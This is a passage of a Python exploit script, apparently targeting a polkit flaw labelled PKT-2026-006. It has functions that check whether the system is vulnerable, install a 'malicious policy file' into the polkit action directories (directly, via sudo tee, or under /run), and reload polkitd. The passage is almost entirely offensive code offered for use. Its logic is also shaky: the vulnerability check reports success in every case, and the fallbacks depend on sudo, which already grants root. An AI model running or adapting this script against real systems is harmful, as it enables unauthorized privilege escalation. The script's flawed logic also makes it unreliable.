def check_vulnerable():
    """Check if system is vulnerable"""
    print("[*] Checking system for PKT-2026-006 vulnerability...")
    
    # Check if polkitd is running
    result = subprocess.run(["pgrep", "-f", "polkitd"], capture_output=True)
    if result.returncode == 0:
        pid = result.stdout.decode().strip().split('\n')[0]
        print(f"[+] polkitd is running (PID: {pid})")
    else:
        print("[!] polkitd is not running")
        return False
    
    # Check for writable policy directories
    policy_dirs = [
        "/etc/polkit-1/actions/",
        "/usr/share/polkit-1/actions/",
        "/run/polkit-1/actions/"
    ]
    
    for dir_path in policy_dirs:
        if os.path.isdir(dir_path):
            if os.access(dir_path, os.W_OK):
                print(f"[+] Directory WRITABLE: {dir_path}")
                return True
        else:
            print(f"[*] Directory does NOT exist: {dir_path}")
    
    print("[+] System appears vulnerable (can write with sudo)")
    return True

def install_policy():
    """Install malicious policy file"""
    print("\n[*] Installing malicious policy file...")
    
    policy_path = "/usr/share/polkit-1/actions/99-exploit.policy"
    
    # Try to write directly first
    try:
        with open(policy_path, 'w') as f:
            f.write(EXPLOIT_POLICY)
        print(f"[+] Policy installed directly: {policy_path}")
        return True
    except PermissionError:
        pass
    
    # Try with sudo
    try:
        sudo_cmd = f"echo '{EXPLOIT_POLICY}' | sudo tee {policy_path} > /dev/null"
        result = subprocess.run(sudo_cmd, shell=True, capture_output=True)
        if result.returncode == 0:
            print(f"[+] Policy installed with sudo: {policy_path}")
            return True
    except Exception as e:
        print(f"[!] Failed to install with sudo: {e}")
    
    # Try /run directory
    run_path = "/run/polkit-1/actions/99-exploit.policy"
    try:
        subprocess.run(["sudo", "mkdir", "-p", "/run/polkit-1/actions/"], check=False)
        with open(run_path, 'w') as f:
            f.write(EXPLOIT_POLICY)
        print(f"[+] Policy installed to: {run_path}")
        return True
    except Exception as e:
        print(f"[!] Failed to install to /run: {e}")
    
    return False

def reload_polkit():
    """Reload polkit to recognize new policies"""
    print("\n[*] Reloading polkit...")
    
    # Method 1: Restart polkitd
    try:
        subprocess.run(["sudo", "systemctl", "restart", "polkit"], 
                      capture_output=True, timeout=5)
        print("[+] Restarted polkit service")
        time.sleep(1)
        return True
    except Exception as e:
        print(f"[!] Failed to restart polkit: {e}")
    
    # Method 2: Send SIGHUP to polkitd
    try:
        result = subprocess.run(["pgrep", "-f", "polkitd"], capture_output=True)
        if result.returncode == 0:
            pid = result.stdout.decode().strip().split('\n')[0]
            subprocess.run(["sudo", "kill", "-HUP", pid], check=True)
            print(f"[+] Sent SIGHUP to polkitd (PID: {pid})")
            time.sleep(1)
            return True
    except Exception as e:
        print(f"[!] Failed to send SIGHUP: {e}")
    
    return False

